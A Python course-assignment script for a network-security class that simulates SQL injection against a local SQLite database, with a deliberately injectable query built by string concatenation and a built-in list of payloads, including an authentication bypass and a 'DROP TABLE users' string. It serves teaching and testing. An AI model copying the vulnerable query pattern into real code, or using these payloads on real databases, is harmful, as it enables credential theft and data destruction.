import sqlite3
import os
import datetime

# Header Block
header = f"""
Python {os.popen('python --version').read().strip()}
Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Author: Clint and Constantine
CSCEA465 Network Security
Peer Learning Assignment: Team: Database B
  - Team Lead: Constantine
  - Offense Team: Constantine, Clint
  - Defense Team: Gwen, Nicasio

Offense Method: SQL Injection
This program simulates SQL injection attacks against a centralized database in a standalone, controlled environment.
It is designed for educational purposes to demonstrate how SQL injection works and how to prevent it.

Key Classes and Functions:
  - SQLInjectionAttacks: Main class for managing SQL injection attacks.
  - get_user_credentials: Simulates an SQL injection attack to extract user credentials.
  - display_menu: Displays a formatted menu of available attacks.
  - get_user_choice: Prompts the user to select an attack by number or name.
  - get_query_input: Prompts the user to input a query or select from predefined options.
  - main_menu: Main loop for interacting with the user.
"""

def print_centered(text):
    """
    Prints text centered in the terminal window.
    """
    terminal_width = os.get_terminal_size().columns
    for line in text.splitlines():
        print(line.center(terminal_width))

def print_boxed(text):
    """
    Prints text inside a box of '*' that scales to the terminal width.
    """
    terminal_width = os.get_terminal_size().columns
    border = '*' * terminal_width
    print(border)
    for line in text.splitlines():
        print(line.center(terminal_width))
    print(border)

class SQLInjectionAttacks:
    def __init__(self):
        """
        Initialize the class with a dictionary of available attacks and counters.
        """
        self.attacks = {
            1: {
                "function": self.get_user_credentials,
                "sqli_name": "Extract User Credentials",
                "default_query": "'OR '1' = '1"  # Default query for this attack
            }
            # Add more attacks here as needed
        }
        self.successful_attacks = 0  # Counter for successful attacks
        self.unsuccessful_attacks = 0  # Counter for unsuccessful attacks

    def execute_attack(self, attack_ID, query, db='test.db'):
        """
        Executes the attack based on the attack_ID and provided query.
        """
        if attack_ID in self.attacks:
            return self.attacks[attack_ID]["function"](query, db)
        else:
            raise ValueError(f"Invalid attack_ID: {attack_ID}")

    def get_user_credentials(self, query, db='test.db'):
        """
        Probes the database for vulnerabilities and attempts to extract all users.
        """
        try:
            print(f"SQLite3: Attempting to connect to {db}...")  # Debug
            db_connection = sqlite3.connect(db)  # Attempt to connect to the database
            print(f"SQLite3: Established connection to {db}!")  # Debug

            print(f"\nSQLite3: Initializing cursor...")  # Debug
            db_cursor = db_connection.cursor()  # Create a cursor
            print(f"SQLite3: Cursor initialized!")  # Debug

            # Construct the query
            probe_query = f"SELECT * FROM users WHERE username = '{query}'"
            print(f"\nExecuting Query: {probe_query}")  # Debug

            db_cursor.execute(probe_query)

            # If successful, collect all user data
            probe_result = db_cursor.fetchall()  # Returns a list of tuples or an empty list
            if len(probe_result) > 0:
                print(f"Extraction Successful!\n")
                self.successful_attacks += 1  # Increment successful attacks counter
            else:
                print(f"Extraction Unsuccessful.\n")
                self.unsuccessful_attacks += 1  # Increment unsuccessful attacks counter

            return probe_result

        except sqlite3.Error as e:
            print(f"Database error: {e}")
            self.unsuccessful_attacks += 1  # Increment unsuccessful attacks counter
            return None

        finally:
            # Close the connection
            if db_connection:
                db_connection.close()

    def display_menu(self):
        """
        Displays a formatted menu of available SQL injection methods and attack statistics.
        """
        menu_text = "\n=== SQL Injection Attack Menu ==="
        for attack_ID, attack_info in self.attacks.items():
            menu_text += f"\n{attack_ID}. {attack_info['sqli_name']}"
        menu_text += "\n================================"
        menu_text += f"\nSuccessful Attacks: {self.successful_attacks}"
        menu_text += f"\nUnsuccessful Attacks: {self.unsuccessful_attacks}"
        menu_text += "\================================"
        print_boxed(menu_text)

    def get_user_choice(self):
        """
        Prompts the user to select an attack by number or name.
        """
        while True:
            choice = input("\nEnter the attack number or name: ").strip().lower()
            # Check if the input is a valid attack number
            if choice.isdigit() and int(choice) in self.attacks:
                return int(choice)
            # Check if the input is a valid attack name
            for attack_ID, attack_info in self.attacks.items():
                if choice == attack_info["sqli_name"].lower():
                    return attack_ID
            print("Invalid choice. Please try again.")

    def get_query_input(self, attack_ID):
        """
        Prompts the user to select a query option: default, manual input, or select from a list.
        """
        attack_info = self.attacks[attack_ID]
        default_query = attack_info.get("default_query", "")

        print("\n=== Query Input Options ===")
        print("1. Use default query (if available)")
        print("2. Manually input username/query")
        print("3. Select from a list of predefined queries")
        print("===========================")

        while True:
            option = input("Enter your choice (1, 2, or 3): ").strip()
            if option == "1":
                if default_query:
                    print(f"Using default query: {default_query}")
                    return default_query
                else:
                    print("No default query available for this attack. Please choose another option.")
            elif option == "2":
                return input("Enter the username/query to probe: ").strip()
            elif option == "3":
                # Example predefined queries (can be expanded)
                predefined_queries = [
                    "'OR '1' = '1",
                    "admin' --",
                    "'; DROP TABLE users; --"
                ]
                print("\nPredefined Queries:")
                for i, query in enumerate(predefined_queries, start=1):
                    print(f"{i}. {query}")
                query_choice = input("Select a query by number: ").strip()
                if query_choice.isdigit() and 1 <= int(query_choice) <= len(predefined_queries):
                    return predefined_queries[int(query_choice) - 1]
                else:
                    print("Invalid choice. Please try again.")
            else:
                print("Invalid option. Please try again.")

    def main_menu(self):
        """
        Main menu function to interact with the user.
        Loops until the user enters "n" to exit.
        """
        print_centered("Welcome to the SQL Injection Simulator!")
        print_centered("This program demonstrates SQL injection attacks in a controlled environment.")
        print_centered("Follow the instructions below to simulate an attack.\n")

        while True:
            # Display the menu
            self.display_menu()

            # Get the user's choice
            attack_ID = self.get_user_choice()

            # Get the database file name or path
            db = input("Enter the database file name or path (default: test.db): ").strip()
            if not db:
                db = 'test.db'

            # Get the query input
            query = self.get_query_input(attack_ID)

            # Execute the selected attack
            print(f"\nExecuting {self.attacks[attack_ID]['sqli_name']}...")
            result = self.execute_attack(attack_ID, query, db)

            # Display the results
            if result:
                print("\nAttack Results:")
                for row in result:
                    print(row)
            else:
                print("\nNo results found or an error occurred.")

            # Ask the user if they want to continue
            continue_choice = input("\nDo you want to perform another attack? (y/n): ").strip().lower()
            if continue_choice != 'y':
                print("Exiting the program. Goodbye!")
                break


# Example usage
if __name__ == "__main__":
    # Print the header block
    print_centered(header)

    # Create an instance of the class
    sql_attacks = SQLInjectionAttacks()

    # Run the main menu
    sql_attacks.main_menu()